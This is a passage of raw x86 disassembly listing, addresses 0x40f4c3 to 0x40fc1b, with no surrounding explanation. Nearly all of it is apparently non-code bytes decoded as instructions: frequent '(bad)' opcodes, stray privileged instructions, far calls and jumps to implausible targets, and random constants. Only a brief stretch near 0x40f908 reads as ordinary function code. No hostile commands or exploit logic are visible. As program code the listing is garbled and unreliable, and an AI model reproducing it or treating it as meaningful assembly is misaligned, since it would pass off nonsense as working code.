  40f4c3:	cmp    eax,0x7dc589c4
  40f4c8:	push   ebx
  40f4c9:	xor    al,BYTE PTR [eax+0x76]
  40f4cc:	or     esp,DWORD PTR [ebx+0x7b]
  40f4cf:	or     eax,DWORD PTR [ebp+0x26]
  40f4d2:	mov    bl,BYTE PTR [ecx]
  40f4d4:	mov    ebp,0xc4a16bee
  40f4d9:	xor    ebx,DWORD PTR [ebp-0x38]
  40f4dc:	sub    al,0x8e
  40f4de:	in     eax,dx
  40f4df:	add    eax,0xf7fab23f
  40f4e4:	enter  0xbde7,0xae
  40f4e8:	jne    0x40f566
  40f4ea:	xor    dl,BYTE PTR [ebp-0x45]
  40f4ed:	or     ah,BYTE PTR [ecx]
  40f4ef:	(bad)  
  40f4f1:	add    DWORD PTR [ebp-0x1ecb5658],ebx
  40f4f7:	fbld   TBYTE PTR [di-0x20f0]
  40f4fc:	mov    esi,0x7a109bd1
  40f501:	dec    esp
  40f502:	cdq    
  40f503:	xor    eax,0xc2b284fa
  40f508:	rcl    DWORD PTR [ebx-0x9cc75b7],cl
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [esi],sp
  40f526:	mov    ah,0xe3
  40f528:	mov    eax,ds:0x7070afb6
  40f52d:	dec    ecx
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f57d
  40f532:	cli    
  40f533:	push   eax
  40f534:	cmp    al,0x62
  40f536:	mov    bh,0xc0
  40f538:	rol    BYTE PTR [ebp+0x40],cl
  40f53b:	or     eax,0x4f089538
  40f540:	add    DWORD PTR [ebx+0x7d],esi
  40f543:	call   0xc5e46ed5
  40f548:	mov    dh,0x85
  40f54a:	scas   eax,DWORD PTR es:[edi]
  40f54b:	adc    BYTE PTR [edi-0x43],cl
  40f54e:	push   ebx
  40f54f:	sub    eax,0xf031ff27
  40f554:	sti    
  40f555:	pop    ebx
  40f556:	fimul  DWORD PTR [edx+ebp*1+0x7264252f]
  40f55d:	test   al,0xb1
  40f55f:	sbb    eax,0x7208c78c
  40f564:	icebp  
  40f565:	dec    edx
  40f566:	cmp    ah,0xed
  40f569:	push   ds
  40f56a:	retf   0xced7
  40f56d:	and    DWORD PTR [ecx+ebx*8+0x549e7bdb],edi
  40f574:	jb     0x40f5c0
  40f576:	cmp    BYTE PTR ds:0x6177c9fd,bh
  40f57c:	pop    ebp
  40f57d:	xchg   esp,eax
  40f57e:	stc    
  40f57f:	aaa    
  40f580:	stos   DWORD PTR es:[edi],eax
  40f581:	scas   al,BYTE PTR es:[edi]
  40f582:	adc    eax,0xb233b91
  40f587:	hlt    
  40f588:	pop    es
  40f589:	inc    edi
  40f58a:	lea    ebx,[edx+0x58]
  40f58d:	dec    ecx
  40f58e:	rol    DWORD PTR ds:0xcd37faba,0x9a
  40f595:	out    dx,eax
  40f596:	push   0xa036353
  40f59b:	pop    esp
  40f59c:	sub    eax,0x6f8a8ea5
  40f5a1:	(bad)  
  40f5a2:	loop   0x40f5fc
  40f5a4:	shl    BYTE PTR [ecx],1
  40f5a6:	test   eax,0xb1dcc81
  40f5ab:	mov    ebx,0x91202b59
  40f5b0:	xor    ah,BYTE PTR [ebx-0x1a7b1894]
  40f5b6:	jno    0x40f5d0
  40f5b8:	stos   DWORD PTR es:[edi],eax
  40f5b9:	cld    
  40f5ba:	loop   0x40f5ca
  40f5bc:	dec    ecx
  40f5bd:	test   edi,edx
  40f5bf:	fild   DWORD PTR [ecx+esi*2]
  40f5c2:	jne    0x40f5bd
  40f5c4:	(bad)  
  40f5c5:	jg     0x40f5eb
  40f5c7:	ret    0x6fd6
  40f5ca:	rol    DWORD PTR [ebp-0x6f21db8d],0x11
  40f5d1:	call   0x4744:0xe07f62ff
  40f5d8:	jp     0x40f57c
  40f5da:	push   ds
  40f5db:	adc    al,0x6
  40f5dd:	das    
  40f5de:	dec    eax
  40f5df:	xchg   ebx,eax
  40f5e0:	mov    esi,0x9d7d8184
  40f5e5:	jecxz  0x40f58f
  40f5e7:	into   
  40f5e8:	(bad)  
  40f5e9:	cmp    esi,DWORD PTR ds:0x6b247723
  40f5ef:	or     BYTE PTR [esi+0x54bb11c0],bl
  40f5f5:	or     al,0x75
  40f5f7:	call   0x2368:0xb431b2c3
  40f5fe:	sub    esi,DWORD PTR ds:0xdd48894c
  40f604:	pop    ecx
  40f605:	cmp    al,0x7
  40f607:	mov    al,0x74
  40f609:	jb     0x40f5a1
  40f60b:	jmp    0xb545dbea
  40f610:	push   ss
  40f611:	sub    al,ah
  40f613:	jb     0x40f5ae
  40f615:	imul   esp,DWORD PTR [eax],0x37
  40f618:	mov    dh,0x29
  40f61a:	ret    0xc67d
  40f61d:	scas   eax,DWORD PTR es:[edi]
  40f61e:	xchg   ecx,eax
  40f61f:	cmp    eax,0x844993da
  40f624:	xchg   ebx,eax
  40f625:	mov    eax,0x770de3e7
  40f62a:	dec    esi
  40f62b:	ins    BYTE PTR es:[edi],dx
  40f62c:	xlat   BYTE PTR ds:[bx]
  40f62e:	cmc    
  40f62f:	(bad)  
  40f630:	cwde   
  40f631:	sbb    dl,bl
  40f633:	mov    dh,0xa
  40f635:	in     eax,dx
  40f636:	int    0x52
  40f638:	inc    esi
  40f639:	cs hlt 
  40f63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f63c:	dec    ecx
  40f63d:	gs mov al,0x5d
  40f640:	pop    ebx
  40f641:	mov    al,ds:0xf2d86a54
  40f646:	ret    
  40f647:	out    dx,eax
  40f648:	dec    edi
  40f649:	clc    
  40f64a:	mov    eax,0xd091d475
  40f64f:	jp     0x40f68e
  40f651:	pop    ebx
  40f652:	push   eax
  40f653:	xchg   BYTE PTR [edi],ah
  40f655:	adc    DWORD PTR [ebx+0x3b555692],0x804ff535
  40f65f:	lods   eax,DWORD PTR ds:[esi]
  40f660:	aaa    
  40f661:	sub    DWORD PTR [ebx+0xcd52611],esi
  40f667:	clc    
  40f668:	inc    ecx
  40f669:	into   
  40f66a:	mov    ah,0x5e
  40f66c:	inc    ecx
  40f66d:	(bad)  
  40f66e:	xorps  xmm0,xmm0
  40f671:	test   ch,dl
  40f673:	test   esi,edx
  40f675:	cmp    eax,0xcf5fc18b
  40f67a:	cmp    ch,BYTE PTR [ecx+0x2d]
  40f67d:	dec    ecx
  40f67e:	pop    esp
  40f67f:	lock call 0x2ac1:0xd038db38
  40f687:	fmul   QWORD PTR [edi-0x1aa6f95b]
  40f68d:	mov    WORD PTR [ebx+0x78],ss
  40f690:	xor    BYTE PTR [edi-0xdf2bc84],0x7
  40f697:	stc    
  40f698:	push   esp
  40f699:	mov    ebp,0x19a4bf04
  40f69e:	shl    DWORD PTR [ecx],cl
  40f6a0:	fdivr  QWORD PTR [ecx+0x1b]
  40f6a3:	and    ch,BYTE PTR [edx]
  40f6a5:	cld    
  40f6a6:	repz rcr DWORD PTR [esi],1
  40f6a9:	jo     0x40f68e
  40f6ab:	adc    DWORD PTR [edx],0xbabab29
  40f6b1:	gs pop ebp
  40f6b3:	jno    0x40f6ac
  40f6b5:	add    eax,0x46a297b4
  40f6ba:	(bad)  
  40f6bb:	stc    
  40f6bc:	inc    esi
  40f6bd:	dec    esp
  40f6be:	leave  
  40f6bf:	sbb    al,BYTE PTR [ebx+eax*4+0x29]
  40f6c3:	outs   dx,BYTE PTR ds:[esi]
  40f6c4:	sbb    al,0xfc
  40f6c6:	xor    DWORD PTR [ecx-0xc58984a],0xffffffd2
  40f6cd:	fist   WORD PTR [ecx]
  40f6cf:	push   ebx
  40f6d0:	dec    ebp
  40f6d1:	(bad)  
  40f6d3:	in     al,0x6
  40f6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d6:	ds cmp eax,0x9cc17cd5
  40f6dc:	not    cl
  40f6de:	(bad)  
  40f6df:	ret    
  40f6e0:	or     esp,DWORD PTR [edi]
  40f6e2:	lock xchg bh,ch
  40f6e5:	leave  
  40f6e6:	cmp    DWORD PTR [ebx-0x369fa1ad],edx
  40f6ec:	sbb    bl,BYTE PTR [eax+0x5a822acd]
  40f6f2:	cld    
  40f6f3:	sub    al,0x6d
  40f6f5:	cmc    
  40f6f6:	jle    0x40f74a
  40f6f8:	fld    DWORD PTR [edx]
  40f6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6fb:	ins    BYTE PTR es:[edi],dx
  40f6fc:	mov    ah,0xda
  40f6fe:	in     eax,dx
  40f6ff:	mov    bh,0x1
  40f701:	cwde   
  40f702:	imul   edx,DWORD PTR ds:0x22b801f8,0x16
  40f709:	je     0x40f74c
  40f70b:	mov    DWORD PTR [ebp+0x67],ebx
  40f70e:	icebp  
  40f70f:	cdq    
  40f710:	enter  0x1f49,0x2a
  40f714:	mov    ds:0x8e3cc6f1,eax
  40f719:	in     al,dx
  40f71a:	je     0x40f74c
  40f71c:	(bad)  
  40f71e:	and    eax,0x9b20931
  40f723:	fdivrp st(3),st
  40f725:	in     al,0xf2
  40f727:	sub    eax,0x458f8e9f
  40f72c:	fcmove st,st(7)
  40f72e:	data16 stos BYTE PTR es:[edi],al
  40f730:	imul   esp,ebx,0x23
  40f733:	stc    
  40f734:	mov    BYTE PTR [ecx-0x17],dl
  40f737:	sbb    dl,dl
  40f739:	adc    eax,0xe5ee6cc4
  40f73e:	inc    edx
  40f73f:	xor    al,BYTE PTR [ebx]
  40f741:	inc    ebp
  40f742:	leave  
  40f743:	pushw  ds
  40f745:	jmp    0x14e7daff
  40f74a:	inc    ecx
  40f74b:	xor    edx,esp
  40f74d:	jg     0x40f762
  40f74f:	lahf   
  40f750:	mov    eax,ds:0x93161794
  40f755:	or     al,0x9f
  40f757:	mov    ah,0x6b
  40f759:	adc    eax,0xd2735bdb
  40f75e:	call   0x545c:0x7d8ec0b6
  40f765:	fs mov eax,0x64bbd546
  40f76b:	pop    ecx
  40f76c:	mov    cl,0x9d
  40f76e:	ds lock or al,0xb4
  40f772:	repnz retf 
  40f774:	mov    edx,0x43fb6e19
  40f779:	pop    ds
  40f77a:	lods   eax,DWORD PTR ds:[esi]
  40f77b:	sti    
  40f77c:	dec    esp
  40f77d:	cld    
  40f77e:	into   
  40f77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f780:	push   0xfffffffd
  40f782:	adc    al,0x5c
  40f784:	pop    ebx
  40f785:	(bad)
  40f788:	into   
  40f789:	push   cs
  40f78a:	mov    cl,0x20
  40f78c:	xor    DWORD PTR [eax],0x3e53b941
  40f792:	xor    al,0xde
  40f794:	push   cs
  40f795:	(bad)  
  40f796:	xchg   ecx,eax
  40f797:	in     eax,0x52
  40f799:	scas   eax,DWORD PTR es:[edi]
  40f79a:	out    dx,eax
  40f79b:	mov    esp,0xdeaedd3d
  40f7a0:	pushf  
  40f7a1:	fnstsw WORD PTR [eax+0x5f3fb419]
  40f7a7:	xchg   esp,eax
  40f7a8:	add    DWORD PTR ds:0xa6b8ca5b,esp
  40f7ae:	test   al,dl
  40f7b0:	jp     0x40f7b7
  40f7b2:	and    al,0xaf
  40f7b4:	ins    DWORD PTR es:[edi],dx
  40f7b5:	cmp    al,0x7c
  40f7b7:	push   esp
  40f7b8:	and    al,0xc
  40f7ba:	aad    0xea
  40f7bc:	test   BYTE PTR [esi+0x6858d476],ch
  40f7c2:	div    DWORD PTR [eax]
  40f7c4:	(bad)  
  40f7c5:	ja     0x40f839
  40f7c7:	jecxz  0x40f805
  40f7c9:	sbb    al,0xc7
  40f7cb:	cmp    edx,DWORD PTR [eax]
  40f7cd:	sub    al,0x51
  40f7cf:	adc    edi,ebx
  40f7d1:	enter  0xda0a,0x70
  40f7d5:	lods   eax,DWORD PTR ds:[esi]
  40f7d6:	ins    DWORD PTR es:[edi],dx
  40f7d7:	sub    edx,DWORD PTR [eax+0x21]
  40f7da:	sbb    DWORD PTR [eax+eiz*4],esi
  40f7dd:	sub    BYTE PTR [eax],ch
  40f7df:	icebp  
  40f7e0:	pop    esi
  40f7e1:	or     edi,DWORD PTR [edx+0x75]
  40f7e4:	es or  al,0x4d
  40f7e7:	scas   eax,DWORD PTR es:[edi]
  40f7e8:	push   cs
  40f7e9:	mov    edx,0xbdeb383b
  40f7ee:	sbb    BYTE PTR [eax],0x9d
  40f7f1:	out    0x3f,eax
  40f7f3:	pop    esp
  40f7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f5:	psubq  xmm2,XMMWORD PTR ds:0x2818ca49
  40f7fd:	lahf   
  40f7fe:	sar    DWORD PTR [eax+eiz*1+0x207a8ac0],cl
  40f805:	mov    ecx,0x7aa47231
  40f80a:	jnp    0x40f84d
  40f80c:	mov    al,ds:0xe3b5dafa
  40f811:	sar    BYTE PTR [edx+esi*2-0x63],cl
  40f815:	jmp    0x2682:0xcbbd114e
  40f81c:	pop    eax
  40f81d:	dec    ebp
  40f81e:	pop    ds
  40f81f:	fiadd  DWORD PTR [eax+0x36]
  40f822:	retf   
  40f823:	push   ecx
  40f824:	clc    
  40f825:	repz add BYTE PTR [edx],al
  40f828:	push   ebp
  40f829:	push   ss
  40f82a:	imul   esp,DWORD PTR [ebx-0x78d6b4f5],0xffffff81
  40f831:	retf   0x9f88
  40f834:	test   al,0x1d
  40f836:	jecxz  0x40f7f9
  40f838:	loope  0x40f823
  40f83a:	clc    
  40f83b:	scas   al,BYTE PTR es:[edi]
  40f83c:	scas   al,BYTE PTR es:[edi]
  40f83d:	test   al,0xc
  40f83f:	push   eax
  40f840:	rol    BYTE PTR [edi+0x5],1
  40f843:	inc    eax
  40f844:	mov    edi,0xe996b3b3
  40f849:	sub    DWORD PTR ds:0xa3a4ce2f,ecx
  40f84f:	(bad)  
  40f851:	add    eax,0x87a9cf97
  40f856:	adc    DWORD PTR [eax-0x1d],ebp
  40f859:	or     al,0xa3
  40f85b:	cld    
  40f85c:	pusha  
  40f85d:	pop    eax
  40f85e:	test   al,0xb3
  40f860:	(bad)  
  40f861:	push   ebx
  40f862:	and    al,dh
  40f864:	int    0xe4
  40f866:	fnstcw WORD PTR [ecx]
  40f868:	xchg   ecx,eax
  40f869:	xchg   ecx,eax
  40f86a:	scas   al,BYTE PTR es:[edi]
  40f86b:	mov    ds:0x4f297a92,eax
  40f870:	mov    bh,0xf4
  40f872:	lock xchg ebx,eax
  40f874:	imul   BYTE PTR [edi]
  40f876:	or     DWORD PTR [esi-0x60711de3],0x2
  40f87d:	imul   eax
  40f87f:	push   ds
  40f880:	push   edx
  40f881:	add    al,0x6e
  40f883:	fwait
  40f884:	jb     0x40f8a9
  40f886:	cs cdq 
  40f888:	sub    BYTE PTR [edx+0x33],al
  40f88b:	mov    cs,ebp
  40f88d:	idiv   edx
  40f88f:	stc    
  40f890:	test   DWORD PTR [ebp+0x23ccf1b7],0x2a73d27d
  40f89a:	sbb    eax,0xfea7187d
  40f89f:	push   ebx
  40f8a0:	mov    ah,0x34
  40f8a2:	inc    esi
  40f8a3:	cmp    cl,dl
  40f8a5:	stc    
  40f8a6:	jp     0x40f897
  40f8a8:	sub    edi,ebx
  40f8aa:	je     0x40f902
  40f8ac:	cmp    BYTE PTR [ebp+0x5],cl
  40f8af:	out    0xf3,al
  40f8b1:	scas   al,BYTE PTR es:[edi]
  40f8b2:	jne    0x40f922
  40f8b4:	sbb    al,0x31
  40f8b6:	dec    edi
  40f8b7:	(bad)  
  40f8b8:	mov    eax,0x23dbeefa
  40f8bd:	gs int3 
  40f8bf:	cli    
  40f8c0:	sub    BYTE PTR [edx+eiz*4+0x3a6b8af3],bh
  40f8c7:	mov    DWORD PTR [ebx+esi*8],edi
  40f8ca:	fadd   DWORD PTR [ebp+0x1dba77ff]
  40f8d0:	push   ecx
  40f8d1:	pop    ecx
  40f8d2:	cmc    
  40f8d3:	aam    0xff
  40f8d5:	retf   0x4ea9
  40f8d8:	rcr    DWORD PTR [ebp-0x1b],1
  40f8db:	mov    bl,0x1c
  40f8dd:	repz dec eax
  40f8df:	int    0x6f
  40f8e1:	inc    ebx
  40f8e2:	sbb    DWORD PTR [ebp+0x7af59763],edi
  40f8e8:	jb     0x40f93b
  40f8ea:	daa    
  40f8eb:	mov    ch,0xda
  40f8ed:	jg     0x40f8b7
  40f8ef:	xchg   BYTE PTR [edi],al
  40f8f1:	test   DWORD PTR [edi+edx*8-0xa],ebp
  40f8f5:	icebp  
  40f8f6:	and    al,0x6c
  40f8f8:	sub    al,0x97
  40f8fa:	sub    ebp,ecx
  40f8fc:	mov    edx,0x644b488d
  40f901:	jb     0x40f954
  40f903:	mov    esp,0x858d8f6c
  40f908:	mov    ecx,DWORD PTR [ebp+0x8]
  40f90b:	add    ecx,DWORD PTR [eax+edi*4]
  40f90e:	lea    eax,[ebp-0x8]
  40f911:	mov    DWORD PTR [ebp-0x30],ecx
  40f914:	push   eax
  40f915:	push   DWORD PTR [ebp-0x30]
  40f918:	push   DWORD PTR [ebp+0xc]
  40f91b:	call   0x403925
  40f920:	mov    eax,DWORD PTR [ebp-0x4]
  40f923:	mov    ecx,DWORD PTR [ebp-0x8]
  40f926:	jmp    0x40fd1a
  40f92b:	or     DWORD PTR ds:[edi],eax
  40f92e:	(bad)  
  40f92f:	rcl    edx,cl
  40f931:	cmp    DWORD PTR [ecx],edx
  40f933:	pop    ecx
  40f934:	jns    0x40f901
  40f936:	popa   
  40f937:	or     eax,0x8f84df03
  40f93c:	stos   DWORD PTR es:[edi],eax
  40f93d:	jo     0x40f9af
  40f93f:	dec    ecx
  40f940:	jge    0x40f9b2
  40f942:	jo     0x40f9a8
  40f944:	sub    edx,0x7
  40f947:	and    ebx,DWORD PTR [eax-0x2d557670]
  40f94d:	xor    ecx,DWORD PTR [edx-0x23]
  40f950:	xchg   edi,eax
  40f951:	and    DWORD PTR [edi+0x60bfb733],0x56eaad44
  40f95b:	mov    edi,0xc49f12fe
  40f960:	mov    BYTE PTR [eax+0x42],bh
  40f963:	jne    0x40f8e8
  40f965:	into   
  40f966:	and    dl,0x5b
  40f969:	cld    
  40f96a:	pop    es
  40f96b:	mov    esi,0xaf264ff5
  40f970:	cmp    DWORD PTR [ebp+0x740d62b4],0x61
  40f977:	sub    edi,DWORD PTR [edi]
  40f979:	and    BYTE PTR [ebx],bl
  40f97b:	adc    BYTE PTR [ebx-0x5e2e7f32],0xd3
  40f982:	lahf   
  40f983:	push   eax
  40f984:	(bad)  
  40f986:	add    BYTE PTR [ecx+0x6a32d4a3],al
  40f98c:	stos   BYTE PTR es:[edi],al
  40f98d:	and    ah,dh
  40f98f:	fldcw  WORD PTR [ecx]
  40f991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f992:	clc    
  40f993:	shl    BYTE PTR [esi+0x47],cl
  40f996:	jnp    0x40f95e
  40f998:	cmp    BYTE PTR [eax],dl
  40f99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f99b:	test   DWORD PTR [ecx+0x2662043d],0xc3a3a0a3
  40f9a5:	mov    edx,0xf5960891
  40f9aa:	dec    ecx
  40f9ab:	je     0x40f9ee
  40f9ad:	push   ecx
  40f9ae:	je     0x40f9ca
  40f9b0:	dec    ebp
  40f9b1:	inc    edx
  40f9b2:	enter  0x8e4a,0xfe
  40f9b6:	push   edi
  40f9b7:	pop    ecx
  40f9b8:	out    0x75,eax
  40f9ba:	jge    0x40fa27
  40f9bc:	rcr    BYTE PTR [edx-0x35],0xa7
  40f9c0:	loopne 0x40f99e
  40f9c2:	cmp    al,BYTE PTR [edx]
  40f9c4:	repnz (bad) 
  40f9c6:	(bad)  
  40f9c7:	jns    0x40f981
  40f9c9:	mov    dh,0x60
  40f9cb:	fs jbe 0x40f962
  40f9ce:	or     al,0xb0
  40f9d0:	fdiv   QWORD PTR [esi+eax*8]
  40f9d3:	and    al,al
  40f9d5:	xchg   ecx,eax
  40f9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9d7:	jp     0x40f9b0
  40f9d9:	ss dec eax
  40f9db:	popa   
  40f9dc:	cld    
  40f9dd:	retf   0x2409
  40f9e0:	xor    BYTE PTR [ebx],dl
  40f9e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9e3:	mov    dh,0x2c
  40f9e5:	push   ebp
  40f9e6:	xchg   esp,eax
  40f9e7:	fs lahf 
  40f9e9:	xlat   BYTE PTR ds:[ebx]
  40f9ea:	mov    edi,0x2183dac4
  40f9ef:	push   eax
  40f9f0:	test   eax,0x68c2f123
  40f9f5:	repz xor BYTE PTR [edi-0x5492035b],bh
  40f9fc:	dec    ecx
  40f9fd:	inc    DWORD PTR [ebx]
  40f9ff:	mul    dl
  40fa01:	sti    
  40fa02:	ds pop esi
  40fa04:	mov    bh,bl
  40fa06:	add    al,0x56
  40fa08:	mov    edx,0xfdca0a7c
  40fa0d:	call   0x9930e301
  40fa12:	call   0xfdc55844
  40fa17:	sti    
  40fa18:	jo     0x40fa88
  40fa1a:	xchg   esp,eax
  40fa1b:	mov    BYTE PTR [eax],dh
  40fa1d:	cmc    
  40fa1e:	cs inc edx
  40fa20:	arpl   WORD PTR [ecx+0x27c86308],cx
  40fa26:	ss jg  0x40fa89
  40fa29:	cld    
  40fa2a:	scas   al,BYTE PTR es:[edi]
  40fa2b:	lods   al,BYTE PTR ds:[esi]
  40fa2c:	(bad)  [edi-0x6c]
  40fa2f:	mov    ecx,0x23d9c3d4
  40fa34:	pop    ss
  40fa35:	loope  0x40f9fb
  40fa37:	mov    eax,0xcb2229bb
  40fa3c:	sub    BYTE PTR [ebp-0x5f585350],al
  40fa42:	dec    eax
  40fa43:	rcl    BYTE PTR [eax+0x6ca1a73d],1
  40fa49:	cmp    DWORD PTR [edx+0x14],esp
  40fa4c:	scas   eax,DWORD PTR es:[edi]
  40fa4d:	fimul  WORD PTR [edx+0x184295e0]
  40fa53:	cmp    bl,BYTE PTR [ebx]
  40fa55:	xor    eax,DWORD PTR [edi-0x1dd22950]
  40fa5b:	xchg   ebx,eax
  40fa5c:	fneni(8087 only) 
  40fa5e:	sbb    BYTE PTR [eax-0x1e],ch
  40fa61:	shl    DWORD PTR [eax+0x6c],1
  40fa64:	jecxz  0x40fac1
  40fa66:	(bad)  
  40fa67:	sub    bh,ah
  40fa69:	(bad)  
  40fa6a:	lds    esi,FWORD PTR [ecx+0x27b2d2ec]
  40fa70:	aad    0x58
  40fa72:	fistp  WORD PTR [edx+ecx*1]
  40fa75:	xchg   DWORD PTR [edx-0x1e],ebx
  40fa78:	clc    
  40fa79:	sub    bh,al
  40fa7b:	retf   
  40fa7c:	js     0x40fafb
  40fa7e:	jae    0x40fad6
  40fa80:	lods   eax,DWORD PTR ds:[esi]
  40fa81:	lods   eax,DWORD PTR ds:[esi]
  40fa82:	mov    bh,0xcc
  40fa84:	cmp    ah,ch
  40fa86:	dec    esp
  40fa87:	adc    eax,0xf265819e
  40fa8c:	jb     0x40fa77
  40fa8e:	xor    bl,BYTE PTR [edi+edi*4]
  40fa91:	xor    eax,0xfd9a6a42
  40fa96:	(bad)  
  40fa97:	pop    edx
  40fa98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa99:	push   es
  40fa9a:	add    ah,BYTE PTR [eax]
  40fa9c:	push   ds
  40fa9d:	dec    edi
  40fa9e:	adc    al,0xca
  40faa0:	retf   
  40faa1:	lahf   
  40faa2:	dec    edi
  40faa3:	pop    esi
  40faa4:	(bad)  
  40faa5:	xchg   ebx,eax
  40faa6:	push   cs
  40faa7:	jmp    0x73b4:0x8e8b80f7
  40faae:	js     0x40faa3
  40fab0:	adc    ebx,DWORD PTR [edi-0x4f]
  40fab3:	pop    ebx
  40fab4:	cwde   
  40fab5:	rcl    BYTE PTR [esi],0x1d
  40fab8:	pop    es
  40fab9:	pop    ebx
  40faba:	dec    ebx
  40fabb:	sahf   
  40fabc:	add    bh,BYTE PTR [eax-0x777c2be0]
  40fac2:	inc    edx
  40fac3:	push   0x13a1ba3b
  40fac8:	call   0x247e:0x4f43417c
  40facf:	jecxz  0x40fa85
  40fad1:	scas   al,BYTE PTR es:[edi]
  40fad2:	rol    dl,0xde
  40fad5:	jmp    0x1d6d:0xcfb9d99b
  40fadc:	and    bl,BYTE PTR [ebx]
  40fade:	es and eax,0xf426bbb5
  40fae4:	int3   
  40fae5:	jae    0x40faf5
  40fae7:	jnp    0x40fa8c
  40fae9:	lods   al,BYTE PTR ds:[esi]
  40faea:	sbb    ebx,DWORD PTR [ebx+0x6e3e5554]
  40faf0:	xor    BYTE PTR [edx-0x22],bh
  40faf3:	arpl   WORD PTR [eax],ax
  40faf5:	mov    esi,0xb2af4344
  40fafa:	(bad)  
  40fafb:	dec    edx
  40fafc:	aad    0x64
  40fafe:	shl    BYTE PTR [eax],cl
  40fb00:	ins    BYTE PTR es:[edi],dx
  40fb01:	ret    0x46bf
  40fb04:	sub    eax,0xe20338e7
  40fb09:	cld    
  40fb0a:	(bad)  
  40fb0b:	sbb    ecx,DWORD PTR [ebp+0x5]
  40fb0e:	push   0xffffffd4
  40fb10:	xchg   edi,eax
  40fb11:	mov    dl,0xbe
  40fb13:	cmp    esi,eax
  40fb15:	jns    0x40fad1
  40fb17:	xchg   BYTE PTR [ecx+edi*8+0x1c],al
  40fb1b:	inc    ecx
  40fb1c:	pop    es
  40fb1d:	or     cl,BYTE PTR [ebx-0x5e]
  40fb20:	dec    edi
  40fb21:	jbe    0x40faf1
  40fb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb24:	(bad)  
  40fb26:	in     eax,0xa0
  40fb28:	pop    ss
  40fb29:	cmp    ecx,DWORD PTR [ecx+0x19]
  40fb2c:	sar    DWORD PTR [ebp+esi*2+0x17],1
  40fb30:	cmp    DWORD PTR [ebp+0x3456dca4],esp
  40fb36:	cli    
  40fb37:	or     DWORD PTR [edi+0x43],esi
  40fb3a:	shl    DWORD PTR [esi],1
  40fb3c:	mov    esp,0x8aeba580
  40fb41:	dec    ecx
  40fb42:	and    esi,0x16e2dfbb
  40fb48:	add    DWORD PTR [ebp+0x12],ecx
  40fb4b:	xchg   esp,eax
  40fb4c:	rol    edx,cl
  40fb4e:	cmp    cl,BYTE PTR [eax]
  40fb50:	sub    DWORD PTR [ebx+0x2b9af0d],esp
  40fb56:	hlt    
  40fb57:	icebp  
  40fb58:	mov    DWORD PTR [eax+0xb6a5069],eax
  40fb5e:	fldcw  WORD PTR [edx+0x1a]
  40fb61:	inc    esi
  40fb62:	mov    dl,BYTE PTR [eax+0x23f51542]
  40fb68:	pop    edi
  40fb69:	(bad)  
  40fb6a:	mov    esi,0x189dec11
  40fb6f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40fb71:	lock repz icebp 
  40fb74:	je     0x40fb8e
  40fb76:	pushf  
  40fb77:	dec    esp
  40fb78:	xor    esp,DWORD PTR [eax-0x6a]
  40fb7b:	mov    eax,0x2e83e901
  40fb80:	add    ah,BYTE PTR [edx+0x2845cb0]
  40fb86:	in     eax,0x90
  40fb88:	lods   al,BYTE PTR ds:[esi]
  40fb89:	add    dh,BYTE PTR [eax]
  40fb8b:	inc    ebx
  40fb8c:	hlt    
  40fb8d:	scas   eax,DWORD PTR es:[edi]
  40fb8e:	ror    BYTE PTR [ebp-0x1e800601],1
  40fb94:	dec    esp
  40fb95:	outs   dx,DWORD PTR ds:[esi]
  40fb96:	pop    edi
  40fb97:	xchg   edi,eax
  40fb98:	jbe    0x40fbf3
  40fb9a:	mov    dh,0xfb
  40fb9c:	test   DWORD PTR [eax],0x89b43eed
  40fba2:	loopne 0x40fbcb
  40fba4:	dec    eax
  40fba5:	rcr    BYTE PTR [eax+0x15b3a4c0],1
  40fbab:	push   ds
  40fbac:	popa   
  40fbad:	mov    cl,0x7f
  40fbaf:	(bad)  
  40fbb0:	mov    ecx,0xcf0918bf
  40fbb5:	mov    eax,0x9d65900b
  40fbba:	arpl   WORD PTR [eax],ax
  40fbbc:	sub    eax,ecx
  40fbbe:	sub    esp,0xffffffa8
  40fbc1:	mov    BYTE PTR [ecx],cl
  40fbc3:	fisttp QWORD PTR [ebx]
  40fbc5:	mov    ebx,0x3b25f078
  40fbca:	add    eax,eax
  40fbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbcd:	mov    ah,0xfd
  40fbcf:	iret   
  40fbd0:	lock cld 
  40fbd2:	mov    ebp,0x700ef041
  40fbd7:	push   edi
  40fbd8:	ss cmp al,0x55
  40fbdb:	adc    eax,0xac8f858e
  40fbe0:	sbb    BYTE PTR [esi-0x2a19071f],bh
  40fbe6:	out    dx,eax
  40fbe7:	xor    ecx,DWORD PTR [edi]
  40fbe9:	aaa    
  40fbea:	cli    
  40fbeb:	sbb    eax,DWORD PTR [eax-0xdc9e71c]
  40fbf1:	jne    0x40fc69
  40fbf3:	iret   
  40fbf4:	xchg   DWORD PTR [ebx],ecx
  40fbf6:	lea    esp,[esi+0x68]
  40fbf9:	adc    eax,0x771ffda2
  40fbfe:	push   eax
  40fbff:	ins    BYTE PTR es:[edi],dx
  40fc00:	call   0x441c:0x6512308f
  40fc07:	loop   0x40fbaa
  40fc09:	jmp    0x40fc36
  40fc0b:	push   edi
  40fc0c:	aam    0xce
  40fc0e:	or     edx,DWORD PTR [ebp+0x62]
  40fc11:	ja     0x40fc29
  40fc13:	cmp    ch,dh
  40fc15:	mov    WORD PTR [edi+ecx*8+0x1a],gs
  40fc19:	mov    al,0xc6
  40fc1b:	pop    ecx
